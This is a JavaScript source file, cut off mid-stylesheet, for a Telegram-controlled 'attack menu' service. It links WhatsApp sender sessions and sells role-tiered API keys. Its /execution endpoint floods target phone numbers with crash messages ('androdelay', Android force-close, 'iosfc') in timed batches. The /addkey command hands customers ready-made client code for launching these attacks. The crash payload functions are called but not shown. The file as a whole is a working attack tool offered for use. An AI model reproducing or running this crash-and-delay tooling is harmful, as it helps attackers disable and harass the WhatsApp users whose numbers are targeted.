const { Telegraf } = require("telegraf");
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const moment = require('moment-timezone');
const config = require("./config.js");
const tokens = config.tokens;
const bot = new Telegraf(tokens);
const axios = require("axios");
const OwnerId = config.owner;
const VPS = config.ipvps;
const sessions = new Map();
const file_session = "./sessions.json";
const sessions_dir = "./auth";
const PORT = config.port;
const file = "./akses.json";

let userApiBug = null;

const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const userPath = path.join(__dirname, "./database/user.json");

// Role definitions
const ROLES = {
  OWNER: 'owner',
  ADMIN: 'admin',
  MODERATOR: 'moderator',
  HELPER: 'helper',
  PREMIUM: 'premium',
  VIP: 'vip',
  EXCLUSIVE: 'exclusive'
};

// Role hierarchy for permission checking
const ROLE_HIERARCHY = {
  [ROLES.OWNER]: 6,
  [ROLES.ADMIN]: 5,
  [ROLES.MODERATOR]: 4,
  [ROLES.HELPER]: 3,
  [ROLES.PREMIUM]: 2,
  [ROLES.VIP]: 1,
  [ROLES.EXCLUSIVE]: 0
};

// Attack mode requirements
const ATTACK_REQUIREMENTS = {
  ph4ntom: ROLES.VIP,
  extr4vaz: ROLES.ADMIN,
  sl4yerz: ROLES.PREMIUM,
  ex4ltedz: ROLES.MODERATOR,
  w4nnacry: ROLES.HELPER
};

// Role permissions
const ROLE_PERMISSIONS = {
  [ROLES.ADMIN]: {
    userManagement: true,
    senderManagement: true
  },
  [ROLES.MODERATOR]: {
    userManagement: true,
    senderManagement: true
  },
  [ROLES.HELPER]: {
    userManagement: true,
    senderManagement: true
  },
  // Other roles have these permissions false by default
};

function loadAkses() {
  if (!fs.existsSync(file)) fs.writeFileSync(file, JSON.stringify({ owners: [], akses: [] }, null, 2));
  return JSON.parse(fs.readFileSync(file));
}

function saveAkses(data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function isOwner(id) {
  const data = loadAkses();
  const allOwners = [config.owner, ...data.owners.map(x => x.toString())];
  return allOwners.includes(id.toString());
}

function isAuthorized(id) {
  const data = loadAkses();
  return isOwner(id) || data.akses.includes(id);
}

module.exports = { loadAkses, saveAkses, isOwner, isAuthorized };

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let key = "";
  for (let i = 0; i < length; i++) {
    key += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return key;
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 24 * 60 * 60 * 1000 : value * 60 * 60 * 1000;
}

function saveUsers(users) {
    const filePath = path.join(__dirname, 'database', 'user.json');

    try {
      fs.writeFileSync(filePath, JSON.stringify(users, null, 2), 'utf-8');
      console.log("✅ Data user berhasil disimpan.");
    } catch (err) {
      console.error("❌ Gagal menyimpan user:", err);
    }
  }
  
const {
  default: makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  useSingleFileAuthState,
  initInMemoryKeyStore,
  fetchLatestBaileysVersion,
  makeWASocket: WASocket,
  AuthenticationState,
  BufferJSON,
  downloadContentFromMessage,
  downloadAndSaveMediaMessage,
  generateWAMessage,
  generateWAMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  generateRandomMessageId,
  prepareWAMessageMedia,
  getContentType,
  mentionedJid,
  relayWAMessage,
  templateMessage,
  InteractiveMessage,
  Header,
  MediaType,
  MessageType,
  MessageOptions,
  MessageTypeProto,
  WAMessageContent,
  WAMessage,
  WAMessageProto,
  WALocationMessage,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMediaUpload,
  WAMessageStatus,
  WA_MESSAGE_STATUS_TYPE,
  WA_MESSAGE_STUB_TYPES,
  Presence,
  emitGroupUpdate,
  emitGroupParticipantsUpdate,
  GroupMetadata,
  WAGroupMetadata,
  GroupSettingChange,
  areJidsSameUser,
  ChatModification,
  getStream,
  isBaileys,
  jidDecode,
  processTime,
  ProxyAgent,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  Browsers,
  Browser,
  WAFlag,
  WAContextInfo,
  WANode,
  WAMetric,
  Mimetype,
  MimetypeMap,
  MediaPathMap,
  DisconnectReason,
  MediaConnInfo,
  ReconnectMode,
  AnyMessageContent,
  waChatKey,
  WAProto,
  proto,
  BaileysError,
} = require('lotusbail');

let sock;

const saveActive = (BotNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(BotNumber)) {
    list.push(BotNumber);
    fs.writeFileSync(file_session, JSON.stringify(list));
  }
};

const sessionPath = (BotNumber) => {
  const dir = path.join(sessions_dir, `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  console.log(chalk.blue(`
┌──────────────────────────────┐
│ Ditemukan sesi WhatsApp aktif
├──────────────────────────────┤
│ Jumlah : ${activeNumbers.length}
└──────────────────────────────┘ `));

  for (const BotNumber of activeNumbers) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    await new Promise((resolve, reject) => {
      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(`Bot ${BotNumber} terhubung!`);
          sessions.set(BotNumber, sock);
          return resolve();
        }
        if (connection === "close") {
          const reconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          return reconnect ? await initializeWhatsAppConnections() : reject(new Error("Koneksi ditutup"));
        }
      });
      sock.ev.on("creds.update", saveCreds);
    });
  }
};

const connectToWhatsApp = async (BotNumber, chatId, ctx) => {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pairing dengan nomor *${BotNumber}*...`, { parse_mode: "Markdown" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "Markdown" });
    } catch (e) {
      console.error("Gagal edit pesan:", e.message);
    }
  };

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  let isConnected = false;

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code >= 500 && code < 600) {
        await editStatus(makeStatus(BotNumber, "Menghubungkan ulang..."));
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }

      if (!isConnected) {
        await editStatus(makeStatus(BotNumber, "❌ Gagal terhubung."));
        return fs.rmSync(sessionDir, { recursive: true, force: true });
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, sock);
      saveActive(BotNumber);
      return await editStatus(makeStatus(BotNumber, "✅ Berhasil terhubung."));
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(BotNumber, "OVERLOAD");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;

          const codeData = makeCode(BotNumber, formatted);
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, codeData.text, {
            parse_mode: "Markdown",
            reply_markup: codeData.reply_markup
          });
        }
      } catch (err) {
        console.error("Error requesting code:", err);
        await editStatus(makeStatus(BotNumber, `❗ ${err.message}`));
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};

const makeStatus = (number, status) => `\`\`\`
┌───────────────────────────┐
│ STATUS │ ${status.toUpperCase()}
├───────────────────────────┤
│ Nomor : ${number}
└───────────────────────────┘\`\`\``;

const makeCode = (number, code) => ({
  text: `\`\`\`
┌───────────────────────────┐
│ STATUS │ SEDANG PAIR
├───────────────────────────┤
│ Nomor : ${number}
│ Kode  : ${code}
└───────────────────────────┘
\`\`\``,
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [{ text: "!! 𝐒𝐚𝐥𝐢𝐧°𝐂𝐨𝐝𝐞 !!", callback_data: `salin|${code}` }]
    ]
  }
});
console.clear();
console.log(chalk.blue(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣤⣶⣾⣿⣿⣿⣷⣶⣤⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀
⠀⠀⠀⠀⢰⡟⠛⠉⠙⢻⣿⡟⠋⠉⠙⢻⡇⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣷⣀⣀⣠⣾⠛⣷⣄⣀⣀⣼⡏⠀⠀⠀⠀
⠀⠀⣀⠀⠀⠛⠋⢻⣿⣧⣤⣸⣿⡟⠙⠛⠀⠀⣀⠀⠀
⢀⣰⣿⣦⠀⠀⠀⠼⣿⣿⣿⣿⣿⡷⠀⠀⠀⣰⣿⣆⡀
⢻⣿⣿⣿⣧⣄⠀⠀⠁⠉⠉⠋⠈⠀⠀⣀⣴⣿⣿⣿⡿
⠀⠀⠀⠈⠙⠻⣿⣶⣄⡀⠀⢀⣠⣴⣿⠿⠛⠉⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⣻⣿⣷⣿⣟⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣠⣴⣿⠿⠋⠉⠙⠿⣷⣦⣄⡀⠀⠀⠀⠀
⣴⣶⣶⣾⡿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣷⣶⣶⣦
⠙⢻⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⡿⠋
⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀
`));

bot.launch();
console.log(chalk.red(`
╭─☐ BOT EVOLUTION WEB
├─ ID OWN : ${OwnerId}
├─ BOT : CONNECTED ✅
╰───────────────────`));
initializeWhatsAppConnections();

function owner(userId) {
  return config.owner.includes(userId.toString());
}

// ----- ( Comand Sender & Del Sende Handlerr ) ----- \\
bot.start((ctx) => {
  const name = ctx.from.first_name || "User";

  const message = `
👾 *Welcome to Evolution Web*

🛡️ SYSTEM COMMAND ACCESS 🛡️

/addakses   → Grant Access
/delakses   → Revoke Access  
/addowner   → Grant Access  
/delowner   → Remove Acces  
/addkey     → Create API Key 
/delkey     → Remove API Key  
/listkey    → Reveal All Active Key  
/connect    → Bind Your Bot Session  
/listsender   → Trace Active Sender
/delsender   → Purge Sender Identity

📥 PANEL LOGIN
→ http://evolutionweb.gacorr.biz.id/login

📡 ACTIVITY IS MONITORED  
All operations are logged.  
No traces. No forgiveness.

💬 CONTACT ADMIN  
└─ (https://t.me/imevolution)

_You are now inside the grid.  
Power is yours to command._
`;

  ctx.replyWithMarkdown(message, {
    disable_web_page_preview: true
  });
});

bot.command("connect", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.reply("Hanya owner yang bisa menambahkan sender.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return await ctx.reply("Masukkan nomor WA: `/connect 62xxxx`", { parse_mode: "Markdown" });
  }

  const BotNumber = args[1];
  await ctx.reply(`⏳ Memulai pairing ke nomor ${BotNumber}...`);
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});

bot.command("listsender", (ctx) => {
  if (sessions.size === 0) return ctx.reply("Tidak ada sender aktif.");
  const list = [...sessions.keys()].map(n => `• ${n}`).join("\n");
  ctx.reply(`*Daftar Sender Aktif:*\n${list}`, { parse_mode: "Markdown" });
});

bot.command("delsender", async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Contoh: /delsender 628xxxx");

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    const updated = data.filter(n => n !== number);
    fs.writeFileSync(file_session, JSON.stringify(updated));

    ctx.reply(`Sender ${number} berhasil dihapus.`);
  } catch (err) {
    console.error(err);
  }
});

bot.command("addkey", (ctx) => {
  if (!isAuthorized(ctx.from.id)) {
    return ctx.reply("❌ Kamu tidak memiliki akses ke fitur ini.");
  }
  const args = ctx.message.text.split(" ")[1];
  if (!args || !args.includes(",")) {
    return ctx.reply("❗ Format salah.\nContoh: /addkey CONTOH,30d,MEMBER");
  }

  const [username, durasiStr, role] = args.split(",");
  const durationMs = parseDuration(durasiStr.trim());
  const userRole = role?.trim().toLowerCase() || ROLES.VIP;

  if (!durationMs) {
    return ctx.reply("❌ Format durasi salah! Gunakan contoh: 7d / 1d / 12h");
  }

  if (!Object.values(ROLES).includes(userRole)) {
    return ctx.reply(`❌ Role tidak valid. Pilihan role: ${Object.values(ROLES).join(', ')}`);
  }

  const key = generateKey(4);
  const expired = Date.now() + durationMs;
  const users = getUsers();

  const userIndex = users.findIndex(u => u.username === username);
  if (userIndex !== -1) {
    users[userIndex].key = key;
    users[userIndex].expired = expired;
    users[userIndex].role = userRole;
  } else {
    users.push({ username, key, expired, role: userRole });
  }

  saveUsers(users);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    timeZone: "Asia/Jakarta"
  });

  const apiBaseUrl = `http://${VPS}:${PORT}/execution`;

  const functionCode = `
🧬 API WEB : \`http://${VPS}:${PORT}/\`
💻 *Contoh Pemakaian Script Client:*

\`\`\`js
const axios = require("axios");

async function sendDelayAndro(targetNumber) {
  try {
    const res = await axios.get(\`${apiBaseUrl}?target=\${targetNumber}&mode=androdelay&username=${username}&key=${key}\`);
    console.log("✅ androdelay:", res.data);
  } catch (err) {
    console.error("❌ Gagal androdelay:", err.response?.data || err.message);
  }
}

async function sendFcAndro(targetNumber) {
  try {
    const res = await axios.get(\`${apiBaseUrl}?target=\${targetNumber}&mode=androdelay&username=${username}&key=${key}\`);
    console.log("✅ androdelay:", res.data);
  } catch (err) {
    console.error("❌ Gagal androdelay:", err.response?.data || err.message);
  }
}

async function sendFcIOS(targetNumber) {
  try {
    const res = await axios.get(\`${apiBaseUrl}?target=\${targetNumber}&mode=iosfc&username=${username}&key=${key}\`);
    console.log("✅ iosfc:", res.data);
  } catch (err) {
    console.error("❌ Gagal iosfc:", err.response?.data || err.message);
  }
}

// Contoh:
// await sendDelayAndro("628xxxx");
// await sendFcAndro("628xxxx");
// await sendFcIOS("628xxxx");
\`\`\`
`;

  ctx.replyWithMarkdown(`✅ *Key berhasil dibuat:*\n\n*Username:* \`${username}\`\n*Key:* \`${key}\`\n*Role:* ${userRole.toUpperCase()}\n*Expired:* _${expiredStr}_ WIB\n\n${functionCode}`);
});

function getUsers() {
  const filePath = path.join(__dirname, 'database', 'user.json');

  if (!fs.existsSync(filePath)) return [];

  try {
    const data = fs.readFileSync(filePath, 'utf-8');
    const parsed = JSON.parse(data);

    if (Array.isArray(parsed)) {
      return parsed;
    }

    if (typeof parsed === 'object' && parsed !== null) {
      return [parsed];
    }

    return [];
  } catch (err) {
    console.error("❌ Gagal membaca file user.json:", err);
    return [];
  }
}

bot.command("listkey", (ctx) => {
  if (!isAuthorized(ctx.from.id)) {
    return ctx.reply("❌ Kamu tidak memiliki akses ke fitur ini.");
  }

  const users = getUsers();
  if (users.length === 0) return ctx.reply("📭 Belum ada key yang dibuat.");

  let teks = `📜 *Daftar Key Aktif:*\n\n`;
  users.forEach((u, i) => {
    const exp = new Date(u.expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "2-digit",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    });
    teks += `*${i + 1}. ${u.username}*\nKey: \`${u.key}\`\nRole: ${u.role?.toUpperCase() || 'VIP'}\nExpired: _${exp}_ WIB\n\n`;
  });

  ctx.replyWithMarkdown(teks);
});

bot.command("delkey", (ctx) => {
  if (!isAuthorized(ctx.from.id)) {
    return ctx.reply("❌ Kamu tidak memiliki akses ke fitur ini.");
  }

  const username = ctx.message.text.split(" ")[1];
  if (!username) return ctx.reply("❗ Masukkan username!\nContoh: /delkey ataaxd");

  const users = getUsers();
  const index = users.findIndex(u => u.username === username);

  if (index === -1) {
    return ctx.reply(`❌ Username \`${username}\` tidak ditemukan.`, { parse_mode: "Markdown" });
  }

  users.splice(index, 1);
  saveUsers(users);

  ctx.reply(`🗑️ Key milik *${username}* berhasil dihapus.`, { parse_mode: "Markdown" });
});

bot.command("addakses", (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.reply("❌ Hanya owner yang bisa tambah akses!");

  const id = ctx.message.text.split(" ")[1];
  if (!id || isNaN(id)) return ctx.reply("⚠️ Format: /addakses <user_id>");

  const data = loadAkses();
  if (data.akses.includes(id)) return ctx.reply("✅ User sudah punya akses.");

  data.akses.push(id);
  saveAkses(data);

  ctx.reply(`✅ Akses diberikan ke ID: ${id}`);
});

bot.command("delakses", (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.reply("❌ Hanya owner yang bisa hapus akses!");
  const id = parseInt(ctx.message.text.split(" ")[1]);
  if (!id) return ctx.reply("⚠️ Format: /delakses <user_id>");

  const data = loadAkses();
  if (!data.akses.includes(id)) return ctx.reply("❌ User tidak ditemukan.");
  data.akses = data.akses.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`🗑️ Akses user ID ${id} dihapus.`);
});

bot.command("addowner", (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.reply("❌ Hanya owner yang bisa tambah owner!");
  const id = parseInt(ctx.message.text.split(" ")[1]);
  if (!id) return ctx.reply("⚠️ Format: /addowner <user_id>");

  const data = loadAkses();
  if (data.owners.includes(id)) return ctx.reply("✅ Sudah owner.");
  data.owners.push(id);
  saveAkses(data);
  ctx.reply(`👑 Owner baru ditambahkan: ${id}`);
});

bot.command("delowner", (ctx) => {
  const userId = ctx.from.id.toString();
  if (!isOwner(userId)) return ctx.reply("❌ Hanya owner yang bisa hapus owner!");
  const id = parseInt(ctx.message.text.split(" ")[1]);
  if (!id) return ctx.reply("⚠️ Format: /delowner <user_id>");

  const data = loadAkses();
  if (!data.owners.includes(id)) return ctx.reply("❌ Bukan owner.");
  data.owners = data.owners.filter(uid => uid !== id);
  saveAkses(data);
  ctx.reply(`🗑️ Owner ID ${id} berhasil dihapus.`);
});

// ---------------------------------------------------------------------------\\
async function DelayAndro(durationHours, X) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
  if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
    console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
    return;
  }

  try {
    if (count < 100) {
      NewBoeg(sock, X);
      await new Promise(r => setTimeout(r, 1000));
      
      console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/10 Andro 📟
└────────────────────────┘
`));
      count++;
      setTimeout(sendNext, 200);
    } else {
      console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
      if (batch < maxBatches) {
        console.log(chalk.yellow(`( XOVIERA OX  ).`));
        count = 0;
        batch++;
        setTimeout(sendNext, 5 * 60 * 1000);
      } else {
        console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
      }
    }
  } catch (error) {
    console.error(`❌ Error saat mengirim: ${error.message}`);
    setTimeout(sendNext, 200);
  }
};
  sendNext();
}

// ---------------------------------------------------------------------------\\
async function FcAndro(durationHours, X) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
  if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
    console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
    return;
  }

  try {
    if (count < 10) {
      Qiwiyz(X);
      await new Promise(r => setTimeout(r, 1000));

      console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/10 Andro 📟
└────────────────────────┘
`));
      count++;
      setTimeout(sendNext, 900);
    } else {
      console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
      if (batch < maxBatches) {
        console.log(chalk.yellow(`( XOVIERA OX  ).`));
        count = 0;
        batch++;
        setTimeout(sendNext, 5 * 60 * 1000);
      } else {
        console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
      }
    }
  } catch (error) {
    console.error(`❌ Error saat mengirim: ${error.message}`);
    setTimeout(sendNext, 700);
  }
};
  sendNext();
}

// ---------------------------------------------------------------------------\\
async function FcIos(durationHours, X) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
  if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
    console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
    return;
  }

  try {
    if (count < 10) {
      IosCrash(X);
      await new Promise(r => setTimeout(r, 1000));

      console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/10 iOS 📟
└────────────────────────┘
`));
      count++;
      setTimeout(sendNext, 900);
    } else {
      console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
      if (batch < maxBatches) {
        console.log(chalk.yellow(`( XOVIERA OX ).`));
        count = 0;
        batch++;
        setTimeout(sendNext, 5 * 60 * 1000);
      } else {
        console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
      }
    }
  } catch (error) {
    console.error(`❌ Error saat mengirim: ${error.message}`);
    setTimeout(sendNext, 700);
  }
};
  sendNext();
}

// ====================== SERVER SETUP ====================== //

app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json()); // Add JSON body parser

// Check user role permissions
function hasPermission(userRole, requiredRole) {
  if (!userRole) return false;
  if (userRole === ROLES.OWNER) return true;
  return ROLE_HIERARCHY[userRole] >= ROLE_HIERARCHY[requiredRole];
}

// Check if user has management permission
function hasManagementPermission(userRole, permissionType) {
  if (userRole === ROLES.OWNER) return true;
  return ROLE_PERMISSIONS[userRole]?.[permissionType] || false;
}

// Login form HTML
const loginFormHTML = (msg = "") => `
<div id="loginFormContainer" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; display: flex; justify-content: center; align-items: center;">
  <div style="background: #0a0a1a; border: 1px solid #00f0ff; padding: 30px; border-radius: 15px; width: 90%; max-width: 450px; box-shadow: 0 0 30px rgba(0, 240, 255, 0.5); position: relative;">
    <div id="closeLogin" style="position: absolute; top: 15px; right: 15px; color: #ff4444; font-size: 24px; cursor: pointer; transition: all 0.3s ease;">&times;</div>
    
    <div style="display: flex; justify-content: center; margin-bottom: 20px;">
      <img src="https://files.catbox.moe/b47zem.jpg" alt="XOVIERA OX" style="width: 80px; height: 80px; border-radius: 50%; object-fit: cover; border: 2px solid #00f0ff; box-shadow: 0 0 20px rgba(0, 240, 255, 0.7);">
    </div>
    
    <h1 style="font-family: 'Nosifer', cursive; text-align: center; color: #00f0ff; text-shadow: 0 0 10px rgba(0, 240, 255, 0.7); margin-bottom: 10px; letter-spacing: 2px;">XOVIERA OX</h1>
    <div style="text-align: center; font-size: 12px; color: #ff00e6; margin-bottom: 20px; font-family: 'Montserrat', sans-serif;">Please Log-in To Your Account</div>
    
    ${msg ? `<div style="color: #ff4444; text-align: center; margin-bottom: 15px; font-size: 14px; text-shadow: 0 0 5px rgba(255, 68, 68, 0.5);">${msg}</div>` : ''}

    <form id="loginForm" method="POST" action="/auth" style="margin-bottom: 20px;">
      <div style="position: relative; margin-bottom: 20px;">
        <i class="fas fa-user" style="position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: #00f0ff;"></i>
        <input type="text" name="username" placeholder="Username" required style="width: 100%; padding: 14px 14px 14px 40px; border-radius: 8px; background: rgba(20, 20, 40, 0.7); border: 1px solid #00f0ff; color: #e6e6fa; font-size: 14px; transition: all 0.3s ease;">
      </div>
      
      <div style="position: relative; margin-bottom: 20px;">
        <i class="fas fa-key" style="position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: #00f0ff;"></i>
        <input type="password" name="key" placeholder="Pasword" required style="width: 100%; padding: 14px 14px 14px 40px; border-radius: 8px; background: rgba(20, 20, 40, 0.7); border: 1px solid #00f0ff; color: #e6e6fa; font-size: 14px; transition: all 0.3s ease;">
      </div>
      
      <button type="submit" style="background: linear-gradient(to right, #00f0ff, #0033ff); color: #0a0a1a; padding: 14px; width: 100%; border-radius: 8px; font-weight: bold; border: none; margin-bottom: 15px; cursor: pointer; transition: all 0.3s ease; font-family: 'Nosifer', cursive; letter-spacing: 1px; text-transform: uppercase;">
        <i class="fas fa-skull-crossbones" style="margin-right: 8px;"></i>
        L O G I N
        <i class="fas fa-skull-crossbones" style="margin-left: 8px;"></i>
      </button>
    </form>
  </div>
</div>
`;

// Main page HTML
const mainPageHTML = (isLoggedIn = false, username = '', role = '', message = '') => `
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>XOVIERA OX | ATTACK MENU</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Montserrat:wght@400;600&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <style>
    :root {
      --primary: #00f0ff;
      --secondary: #0033ff;
      --accent: #ff00e6;
      --text: #e6e6fa;
      --dark: #0a0a1a;
      --light: #f8f8ff;
      --success: #00ff7f;
      --danger: #ff4444;
      --warning: #ffaa00;
    }
    
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Montserrat', sans-serif;
    }
    
    body {
      background: linear-gradient(135deg, var(--dark), #000033);
      background-size: 400% 400%;
      animation: gradientBG 15s ease infinite;
      color: var(--text);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      padding: 20px;
      position: relative;
      overflow-x: hidden;
    }
    
    @keyframes gradientBG {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    
    body::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: 
        radial-gradient(circle at 20% 30%, rgba(0, 240, 255, 0.1) 0%, transparent 20%),
        radial-gradient(circle at 80% 70%, rgba(255, 0, 230, 0.1) 0%, transparent 20%),
        linear-gradient(to bottom, transparent 90%, rgba(0, 240, 255, 0.1) 100%);
      z-index: -1;
    }
    
    .container {
      background: rgba(10, 10, 26, 0.8);
      border: 1px solid var(--primary);
      padding: 30px;
      border-radius: 15px;
      max-width: 500px;
      width: 100%;
      box-shadow: 
        0 0 20px rgba(0, 240, 255, 0.5),
        0 0 40px rgba(0, 51, 255, 0.3);
      backdrop-filter: blur(10px);
      position: relative;
      overflow: hidden;
      transition: all 0.3s ease;
    }
    
    .logo-container {
      display: flex;
      justify-content: center;
      margin-bottom: 20px;
      position: relative;
    }
    
    .logo {
      width: 80px;
      height: 80px;
      border-radius: 50%;
      object-fit: cover;
      border: 2px solid var(--primary);
      box-shadow: 0 0 20px rgba(0, 240, 255, 0.7);
      transition: all 0.3s ease;
    }
    
    .username {
      font-size: 24px;
      color: var(--primary);
      font-weight: bold;
      text-align: center;
      margin-bottom: 5px;
      font-family: 'Orbitron', sans-serif;
      text-shadow: 0 0 10px rgba(0, 240, 255, 0.7);
      letter-spacing: 1px;
    }
    
    .role-badge {
      display: inline-block;
      padding: 3px 8px;
      border-radius: 4px;
      font-size: 12px;
      font-weight: bold;
      text-transform: uppercase;
    }
    
    .owner-badge {
      background: linear-gradient(to right, #ff00e6, #ff4444);
    }
    
    .admin-badge {
      background: linear-gradient(to right, #ffaa00, #ff4444);
    }
    
    .moderator-badge {
      background: linear-gradient(to right, #00f0ff, #0033ff);
    }
    
    .helper-badge {
      background: linear-gradient(to right, #00ff7f, #00f0ff);
    }
    
    .premium-badge {
      background: linear-gradient(to right, #ff00e6, #0033ff);
    }
    
    .vip-badge {
      background: linear-gradient(to right, #ffaa00, #ff00e6);
    }
    
    .exclusive-badge {
      background: linear-gradient(to right, #00ff7f, #ffaa00);
    }
    
    .status {
      font-size: 14px;
      color: var(--success);
      margin-bottom: 20px;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 8px;
    }
    
    .status::before {
      content: '';
      width: 10px;
      height: 10px;
      background: var(--success);
